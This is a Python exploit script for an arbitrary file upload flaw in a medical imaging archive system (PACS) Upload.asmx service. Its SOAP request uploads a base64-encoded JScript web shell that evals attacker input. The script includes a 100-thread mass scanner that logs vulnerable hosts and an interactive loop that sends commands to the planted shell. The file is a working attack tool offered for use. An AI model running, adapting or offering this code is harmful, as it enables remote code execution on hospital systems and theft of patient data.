import sys
import argparse
import requests
import logging
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    banner = r"""
            _              __     _     _       
       (_)            / _|   (_)   | |      
       
  _   _ _ _ __   __ _| |_ ___ _  __| | __ _ 
 | | | | | '_ \ / _` |  _/ _ \ |/ _` |/ _` |
 | |_| | | | | | (_| | ||  __/ | (_| | (_| |
  \__, |_|_| |_|\__, |_| \___|_|\__,_|\__,_|
   __/ |         __/ |                      
  |___/         |___/                       
    

    """
    print(banner)


def main():
    banner()
    parser = argparse.ArgumentParser(description="英飞达医学影像存档与通信系统Upload.asmx任意文件上传漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        # poc(args.url)
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload = "/webservices/Upload.asmx"
    payload1 = "/spool/1/rce.asmx/Cmdshell?Pass=Response.Write('Hello,World')"
    headers = {
        "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/118.0.0.0Safari/537.36",
        "Accept-Encoding": "gzip,deflate",
        "Content-Type": "text/xml;charset=utf-8",
        "SOAPAction": "http://tempuri.org/UploadData",
        "Connection": "close",
        "Content-Length": "1000"
    }
    data = ('<?xml version="1.0" encoding="utf-8"?>\r\n<soap:Envelope '
            'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" '
            'xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\r\n<soap:Body>\r\n<UploadData '
            'xmlns="http://tempuri.org/">\r\n<guid>1</guid>\r\n<patientId>1</patientId>\r\n<patientName>1'
            '</patientName>\r\n<fileName>rce.asmx</fileName>\r\n<fileSize>1000</fileSize>\r\n<file'
            '>PCVAIFdlYlNlcnZpY2UgTGFuZ3VhZ2U9IkpTY3JpcHQiIENsYXNzPSJXZWJTZXJ2aWNlMSIgJT4KIAppbXBvcnQgU3lzdGVtO2ltcG9ydCBTeXN0ZW0uV2ViO2ltcG9ydCBTeXN0ZW0uSU87aW1wb3J0IFN5c3RlbS5XZWIuU2VydmljZXM7CmltcG9ydCBTeXN0ZW0uV2ViLlNjcmlwdC5TZXJ2aWNlczsKaW1wb3J0IFN5c3RlbS5XZWI7CmltcG9ydCBTeXN0ZW0uV2ViLlNlcnZpY2VzOwogCnB1YmxpYyBjbGFzcyBXZWJTZXJ2aWNlMSBleHRlbmRzIFdlYlNlcnZpY2UKewogCldlYk1ldGhvZEF0dHJpYnV0ZSBTY3JpcHRNZXRob2RBdHRyaWJ1dGUgZnVuY3Rpb24gQ21kc2hlbGwoUGFzcyA6IFN0cmluZykgOiBWb2lkCiAgICB7CiAgICAgICAgICAgIHZhciBjID0gSHR0cENvbnRleHQuQ3VycmVudDsKICAgICAgICAgICAgdmFyIFJlcXVlc3QgPSBjLlJlcXVlc3Q7CiAgICAgICAgICAgIHZhciBSZXNwb25zZSA9IGMuUmVzcG9uc2U7CiAgICAgICAgICAgIGV2YWwoUGFzcyk7CiAgICB9Cn0=</file>\r\n</UploadData>\r\n</soap:Body>\r\n</soap:Envelope>')
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080"
    }
    try:
        res = requests.post(url=target + payload, data=data, headers=headers, verify=False, timeout=5)
        if res.status_code == 200:
            res1 = requests.get(url=target + payload1, data=data, verify=False, timeout=5)
            if "Hello,World" in res1.text:
                print(f"[+] {target} 存在漏洞")
                with open("result3.txt", 'a') as f:
                    f.write(target + "\n")
                    return True
        else:
            print(f"[-] {target} 不存在漏洞")
    except Exception as e:
        print(f"[-] 该 {target} 请求失败: {e}")


def exp(target):
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080"
    }

    data = ('<?xml version="1.0" encoding="utf-8"?>\r\n<soap:Envelope '
            'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" '
            'xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\r\n<soap:Body>\r\n<UploadData '
            'xmlns="http://tempuri.org/">\r\n<guid>1</guid>\r\n<patientId>1</patientId>\r\n<patientName>1'
            '</patientName>\r\n<fileName>rce.asmx</fileName>\r\n<fileSize>1000</fileSize>\r\n<file'
            '>PCVAIFdlYlNlcnZpY2UgTGFuZ3VhZ2U9IkpTY3JpcHQiIENsYXNzPSJXZWJTZXJ2aWNlMSIgJT4KIAppbXBvcnQgU3lzdGVtO2ltcG9ydCBTeXN0ZW0uV2ViO2ltcG9ydCBTeXN0ZW0uSU87aW1wb3J0IFN5c3RlbS5XZWIuU2VydmljZXM7CmltcG9ydCBTeXN0ZW0uV2ViLlNjcmlwdC5TZXJ2aWNlczsKaW1wb3J0IFN5c3RlbS5XZWI7CmltcG9ydCBTeXN0ZW0uV2ViLlNlcnZpY2VzOwogCnB1YmxpYyBjbGFzcyBXZWJTZXJ2aWNlMSBleHRlbmRzIFdlYlNlcnZpY2UKewogCldlYk1ldGhvZEF0dHJpYnV0ZSBTY3JpcHRNZXRob2RBdHRyaWJ1dGUgZnVuY3Rpb24gQ21kc2hlbGwoUGFzcyA6IFN0cmluZykgOiBWb2lkCiAgICB7CiAgICAgICAgICAgIHZhciBjID0gSHR0cENvbnRleHQuQ3VycmVudDsKICAgICAgICAgICAgdmFyIFJlcXVlc3QgPSBjLlJlcXVlc3Q7CiAgICAgICAgICAgIHZhciBSZXNwb25zZSA9IGMuUmVzcG9uc2U7CiAgICAgICAgICAgIGV2YWwoUGFzcyk7CiAgICB9Cn0=</file>\r\n</UploadData>\r\n</soap:Body>\r\n</soap:Envelope>')
    while True:
        cmd = input("请输入您要打印的内容:")
        payload = "/spool/1/rce.asmx/Cmdshell?Pass=Response.Write('" + cmd + "')"
        if cmd == 'q':
            exit()
        res2 = requests.get(url=target + payload, verify=False, timeout=5)
        if res2.status_code == 200:
            res3 = requests.get(url=target + payload, data=data, verify=False, timeout=5)
            if res3.text == "":
                print("不存在")
            else:
                print(res3.text)


if __name__ == '__main__':
    main()
